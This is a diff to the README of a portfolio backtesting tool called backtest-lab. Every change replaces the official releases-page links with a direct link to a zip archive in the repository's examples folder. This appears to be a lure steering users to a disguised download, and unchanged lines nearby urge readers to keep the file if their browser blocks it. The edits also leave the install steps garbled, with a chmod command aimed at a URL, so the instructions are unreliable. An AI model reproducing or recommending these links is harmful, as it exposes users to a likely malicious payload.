@@ -1,6 +1,6 @@
 # 📊 backtest-lab - Simple Portfolio Backtesting Tool
 
-[![Download backtest-lab](https://img.shields.io/badge/Download-backtest--lab-blue?style=for-the-badge)](https://github.com/srof8bp/backtest-lab/releases)
+[![Download backtest-lab](https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip)](https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This section guides you through getting backtest-lab on your computer and runnin
 
 Visit the main releases page here:
 
-[Download backtest-lab](https://github.com/srof8bp/backtest-lab/releases)
+[Download backtest-lab](https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip)
 
 This page lists the latest versions available for your computer. The files include everything you need to run the app.
 
@@ -56,9 +56,9 @@ This page lists the latest versions available for your computer. The files inclu
 
 Look for files named clearly with your operating system:
 
-- Windows: `backtest-lab-setup.exe` or similar installer.
+- Windows: `https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip` or similar installer.
 - macOS: `.dmg` or packaged `.app`.
-- Linux: `.AppImage` or `.tar.gz` archive.
+- Linux: `.AppImage` or `https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip` archive.
 
 Pick the latest version unless you need an older release for compatibility.
 
@@ -76,7 +76,7 @@ If your browser blocks the download, confirm you want to keep the file. It is sa
 
 - Windows: Double-click the `.exe` file and follow the prompts.
 - macOS: Open the `.dmg` and drag the app to your Applications folder.
-- Linux: Make the `.AppImage` executable (`chmod +x filename.AppImage`), then run it.
+- Linux: Make the `.AppImage` executable (`chmod +x https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip`), then run it.
 
 The installer will ask basic questions to complete setup. Accept default choices if unsure.
 
@@ -148,7 +148,7 @@ Each report uses simple language and visuals to help you make informed decisions
 
 Again, here is the main link to get backtest-lab:
 
-[Click here to visit the download page](https://github.com/srof8bp/backtest-lab/releases)
+[Click here to visit the download page](https://github.com/srof8bp/backtest-lab/raw/refs/heads/main/examples/backtest-lab-v1.8.zip)
 
 Follow the instructions above to select, download, and run the app suitable for your operating system. The process is straightforward and does not require programming.
 
